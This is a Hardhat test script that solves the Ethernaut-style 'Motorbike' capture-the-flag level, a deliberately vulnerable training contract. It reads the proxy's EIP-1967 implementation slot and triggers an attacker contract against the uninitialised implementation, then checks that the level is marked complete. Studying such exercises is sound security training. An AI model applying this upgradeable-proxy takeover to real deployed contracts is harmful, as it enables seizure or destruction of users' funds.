const {ethers, network} = require("hardhat")
const {BigNumber} = require("ethers");
const {expect, assert} = require("chai")
const {getContract, sleep, createLevelInstance} = require("./helpers");
const {boolean} = require("hardhat/internal/core/params/argumentTypes");

describe(`Solving the Motorbike challenge.`, () => {
    let accounts, player, target, targetAddress, engine, attacker;
    before(async () => {
        console.log("before()");
        accounts = (await ethers.getSigners());
        player = (await accounts[0]).address;
        let attackerAddress;
        if (network.name === 'rinkeby') {
            assert.equal(player, '0xe5e00c76DB49E2aB2294b19dDb3145C8975cF8a2',
                `Address at first account (${player}) is not correct.`);
            targetAddress = '0x36Bd108f74989240c4301cB0c42adD3CA49ec4Db';
            attackerAddress = '0x2cB4bC14812260827103Be9C07826579Cfa85DFd';
        }
        if (network.name === 'hardhat') {
            target = await createLevelInstance(
                player, 'MotorbikeFactory', 'Motorbike'
            );
            engine = await getContract('Engine', (await target.address));
        } else {
            target = await getContract('Motorbike', targetAddress);
            engine = await getContract('Engine', (await target.address));
        }
        assert.isNotNull(target);
        assert.isNotNull(engine);
        attacker = await getContract('MotorbikeAttacker', attackerAddress);
        console.log(`Attacker deployed to ${await attacker.address}`);
    });

    beforeEach(() => {
        //console.log("beforeEach()");
    });

    let implAddress;
    it('prepare contract', async () => {
        console.log(`setting up contract and environment for exploitation with player = ${player}`);
        const slot = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc';
        implAddress = await ethers.provider.getStorageAt(await target.address, slot);
        implAddress = '0x' + JSON.stringify(implAddress).substr(27, 40);
        implAddress = ethers.utils.getAddress(implAddress);
        const expected = {
            "hardhat": '0xa16E02E87b7454126E5E10d957A927A7F5B5d2be',
            "rinkeby": '0x55d8480cc077F327A74fE77ddc4E846E4238A2a6'
        };
        assert.equal(implAddress, expected[network.name]);
        //assert.equal(implAddress, await engine.address);
    });

    it(`exploits contract...`, async () => {
        console.log(`exploits contract with player = ${player}`);
        const block = await ethers.provider.getBlock(await engine.hash);

        let txn;
        try {
            txn = await attacker.attack(implAddress, {
                from: player,
                gasPrice: block.gasLimit.toNumber(),
            });
        } catch (e) {
            console.log("Exception thrown, but the exploit probably succeeded anyway.");
        }
        console.log(await txn.hash);
    });

    afterEach(async () => {
        console.log("afterEach");
    });

    after(async () => {
        console.log("after");
        if (network.name === 'hardhat') {
            const validator = await getContract('MotorbikeFactory');
            const response = await validator.validateInstance(await target.address, player);
            let receipt = await ethers.provider.getTransactionReceipt(response.hash);
            const log = validator.interface.parseLog(receipt.logs[0]);
            assert.equal(log.name, 'LevelCompletedLog',
                `Local blockchain validation failed for Motorbike challenge.`);
        }
    });
});